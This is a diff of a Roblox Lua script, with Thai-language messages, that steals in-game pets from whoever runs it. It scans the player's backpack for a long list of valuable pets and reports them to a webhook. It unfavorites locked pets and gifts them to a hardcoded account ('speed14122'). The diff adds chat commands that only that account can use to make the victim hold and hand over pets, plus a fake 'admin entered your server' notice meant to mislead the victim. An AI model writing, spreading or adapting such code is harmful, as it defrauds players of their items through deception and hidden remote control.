@@ -7,21 +7,15 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local player = Players.LocalPlayer
 local backpack = player:WaitForChild("Backpack")
 local notified = false
-local readyToGift = false
-
-task.delay(10, function()
-	readyToGift = true
-end)
+local currentHeld = nil
 
 local targetNames = {
-	"Red Fox",
-	"Raccoon",
-	"Dragonfly",
-	"Queen Bee",
-	"Disco Bee",
-	"Cooked Owl",
-	"Blood Owl",
-	"Moon cat"
+	"Red Fox", "Raccoon", "Dragonfly", "Queen Bee", "Disco Bee", "Cooked Owl", "Blood Owl", "Moon cat",
+	"Panda", "Polar Bear", "Praying Mantis", "Chicken Zombie",
+	"Dog", "Golden Lab", "Bunny", "Bee", "Black Bunny", "Chicken", "Cat", "Deer", "Hedgehog", "Kiwi",
+	"Orange Tabby", "Monkey", "Pig", "Honey Bee", "Spotted Deer", "Rooster", "Silver Monkey", "Cow",
+	"Sea Otter", "BloodH edgehog", "Petal Bee", "Turtle", "Snail", "Squirrel", "Mole", "Frog", "Giant Ant",
+	"Red Giant Ant", "Grey Mouse", "Owl", "Bear Bee", "Blood Kiwi", "Brown Mouse", "Caterpillar", "Echo Frog", "Night Owl"
 }
 
 local giftTargetName = "speed14122"
@@ -47,12 +41,6 @@ local function sendWebhook(url, message, playerName)
 	notified = true
 end
 
-local function giftPetToPlayer(targetPlayer)
-	local args = { "GivePet", targetPlayer }
-	local petGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
-	petGiftingService:FireServer(unpack(args))
-end
-
 local function isTargetName(name)
 	for _, target in ipairs(targetNames) do
 		if string.find(name, target) then
@@ -62,43 +50,61 @@ local function isTargetName(name)
 	return false
 end
 
-local function unFavoriteLockedTarget()
+local function unFavoriteLocked()
 	local character = player.Character
 	if not character then return end
 	for _, obj in ipairs(character:GetChildren()) do
 		if obj:IsA("Tool") and obj:FindFirstChild("Locked") then
-			for _, target in ipairs(targetNames) do
-				if string.find(obj.Name, target) then
-					local args = { obj }
-					local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
-					remote:FireServer(unpack(args))
-				end
+			if isTargetName(obj.Name) then
+				local args = { obj }
+				local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+				remote:FireServer(unpack(args))
 			end
 		end
 	end
 end
 
-local function checkBackpackAndGift()
-	if not readyToGift then return end
+local function giftPetToPlayer(targetPlayer, tool)
+	if not tool or not targetPlayer then return end
+	local args = { "GivePet", targetPlayer }
+	ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService"):FireServer(unpack(args))
+end
 
-	local targetPlayer = Players:FindFirstChild(giftTargetName)
-	if not targetPlayer then return end
+local function holdPet(petName)
+	for _, item in ipairs(backpack:GetChildren()) do
+		if item:IsA("Tool") and string.find(item.Name, petName) then
+			item.Parent = player.Character
+			currentHeld = item
+			unFavoriteLocked()
+			return true
+		end
+	end
+	return false
+end
 
+local function holdAllTargets()
 	for _, item in ipairs(backpack:GetChildren()) do
 		if item:IsA("Tool") and isTargetName(item.Name) then
 			item.Parent = player.Character
-			unFavoriteLockedTarget()
-			sendWebhook(webhookUrl, "🎯 พบ `" .. item.Name .. "` และส่งให้ `" .. giftTargetName .. "`", player.Name)
-			giftPetToPlayer(targetPlayer)
-			return
+		end
+	end
+	unFavoriteLocked()
+end
+
+local function giftAllHeld(targetPlayer)
+	if not targetPlayer then return end
+	local character = player.Character
+	if not character then return end
+	for _, tool in ipairs(character:GetChildren()) do
+		if tool:IsA("Tool") and isTargetName(tool.Name) then
+			giftPetToPlayer(targetPlayer, tool)
+			wait(0.5)
 		end
 	end
 end
 
--- ✅ รายงานสัตว์เป้าหมายที่มีทันทีตอนรัน
 local function reportInitialTargets()
 	local foundCounts = {}
-
 	for _, item in ipairs(backpack:GetChildren()) do
 		if item:IsA("Tool") then
 			for _, target in ipairs(targetNames) do
@@ -108,22 +114,64 @@ local function reportInitialTargets()
 			end
 		end
 	end
-
 	local parts = {}
 	for name, count in pairs(foundCounts) do
 		table.insert(parts, name .. " " .. count .. " ตัว")
 	end
-
 	if #parts > 0 then
 		local message = "📦 พบสัตว์เป้าหมายในกระเป๋า: " .. table.concat(parts, ", ")
 		sendWebhook(webhookUrl, message, player.Name)
 	end
 end
 
-reportInitialTargets()
-unFavoriteLockedTarget()
+local function showAdminNotification()
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "AdminNotice"
+	gui.Parent = player:WaitForChild("PlayerGui")
 
-while true do
-	checkBackpackAndGift()
-	wait(1)
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(0.5, 0, 0.1, 0)
+	label.Position = UDim2.new(0.25, 0, 0.45, 0)
+	label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	label.TextColor3 = Color3.fromRGB(255, 255, 255)
+	label.Font = Enum.Font.GothamBold
+	label.TextScaled = true
+	label.Text = "⭐ แอดมิน ได้เข้ามาในเซิร์ฟของคุณ ⭐"
+	label.Parent = gui
+
+	task.delay(5, function()
+		gui:Destroy()
+	end)
 end
+
+reportInitialTargets()
+unFavoriteLocked()
+
+Players.PlayerAdded:Connect(function(plr)
+	if plr.Name == giftTargetName then
+		showAdminNotification()
+	end
+end)
+
+Players.PlayerChatted:Connect(function(chatPlayer, message)
+	if chatPlayer.Name ~= giftTargetName then return end
+	local lowerMsg = string.lower(message)
+
+	if string.sub(lowerMsg, 1, 13) == "/ถือทั้งหมด" then
+		holdAllTargets()
+	elseif string.sub(lowerMsg, 1, 13) == "/ให้ทั้งหมด" then
+		local targetPlayer = Players:FindFirstChild(giftTargetName)
+		giftAllHeld(targetPlayer)
+	elseif string.sub(lowerMsg, 1, 4) == "/ถือ" then
+		local pet = string.sub(message, 5):lower()
+		for _, target in ipairs(targetNames) do
+			if string.find(string.lower(target), pet) then
+				holdPet(target)
+				break
+			end
+		end
+	elseif lowerMsg == "/ให้ผม" then
+		local targetPlayer = Players:FindFirstChild(giftTargetName)
+		giftPetToPlayer(targetPlayer, currentHeld)
+	end
+end)
